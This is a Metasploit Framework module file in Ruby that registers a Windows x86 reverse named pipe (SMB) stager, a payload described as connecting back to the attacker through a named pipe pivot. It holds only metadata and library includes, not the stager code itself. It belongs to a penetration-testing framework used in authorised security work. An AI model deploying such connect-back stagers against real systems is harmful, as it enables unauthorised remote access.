##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_named_pipe'
require 'msf/core/payload/windows/reverse_named_pipe'

module MetasploitModule

  CachedSize = 276

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseNamedPipe

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x86 Reverse Named Pipe (SMB) Stager',
      'Description' => 'Connect back to the attacker via a named pipe pivot',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Handler'     => Msf::Handler::ReverseNamedPipe,
      'Arch'        => ARCH_X86,
      'Convention'  => 'handleedi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

end

